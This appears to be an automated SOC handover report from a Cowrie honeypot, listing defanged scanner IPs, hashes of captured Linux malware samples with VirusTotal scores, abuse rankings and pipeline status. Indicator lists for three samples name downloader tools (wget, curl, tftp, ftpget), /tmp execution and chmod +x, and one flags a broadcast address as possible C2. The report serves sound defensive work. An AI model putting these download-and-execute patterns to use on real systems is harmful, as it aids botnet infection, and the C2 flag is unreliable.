## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.105[.]246` | **16** | 2026-07-26 15:39 | 2026-07-26 16:12 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `160.119.71[.]92` | **7** | 2026-07-26 15:17 | 2026-07-26 15:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **6** | 2026-07-26 15:27 | 2026-07-26 16:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-26 14:59 | 2026-07-26 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-07-26 15:02 | 2026-07-26 15:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-26 16:23 | 2026-07-26 16:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]142` | **3** | 2026-07-26 15:45 | 2026-07-26 15:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `41.168.10[.]139` | **3** | 2026-07-26 15:48 | 2026-07-26 16:52 | 1m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-26 15:51 | 2026-07-26 15:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.80.83[.]86` | **2** | 2026-07-26 15:08 | 2026-07-26 15:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]148` | **2** | 2026-07-26 15:53 | 2026-07-26 15:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | **2** | 2026-07-26 15:34 | 2026-07-26 16:15 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.152.52[.]202` | 1 | 2026-07-26 15:15 | 2026-07-26 15:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.50.225[.]91` | 1 | 2026-07-26 16:45 | 2026-07-26 16:46 | 12s | 0 | `T1592` | 🟢 LOW |
| `124.174.32[.]95` | 1 | 2026-07-26 15:03 | 2026-07-26 15:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.124.183[.]254` | 1 | 2026-07-26 14:59 | 2026-07-26 15:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]248` | 1 | 2026-07-26 14:56 | 2026-07-26 14:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]236` | 1 | 2026-07-26 16:32 | 2026-07-26 16:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.12[.]224` | 1 | 2026-07-26 15:01 | 2026-07-26 15:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-26 16:05 | 2026-07-26 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]151` | 1 | 2026-07-26 15:53 | 2026-07-26 15:53 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-26 15:36 | 2026-07-26 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]53` | 1 | 2026-07-26 16:02 | 2026-07-26 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]99` | 1 | 2026-07-26 16:47 | 2026-07-26 16:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-07-26 14:56 | 2026-07-26 14:56 | 5s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-07-26 15:43 | 2026-07-26 15:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | 1 | 2026-07-26 15:31 | 2026-07-26 15:31 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.20.187[.]47` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `24.142.170[.]231` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `60.173.105[.]206` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `117.158.166[.]73` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `41.168.10[.]139` | ZA | Liquid Telecommunications Operations Limited | **100** ⚠️ | 16 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `60.166.8[.]174` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `151.243.11[.]236` | DE | LLC VASH KREDIT BANK | **100** ⚠️ | 22 |
| `58.22.255[.]28` | CN | Longyan city, fujian provincial network of CNCGROUP | **100** ⚠️ | 50 |
| `112.197.2[.]116` | VN | Asia Pacific Network Information Centre | **100** ⚠️ | 42 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 87 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 58 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 6 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 6 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 6 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 142 cases |
| Tool 34  | Credential Extractor        | ✅ 74 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 76 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 27 recon entry/entries in table (12 group(s) consolidating 55 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-26T17:07:35Z_
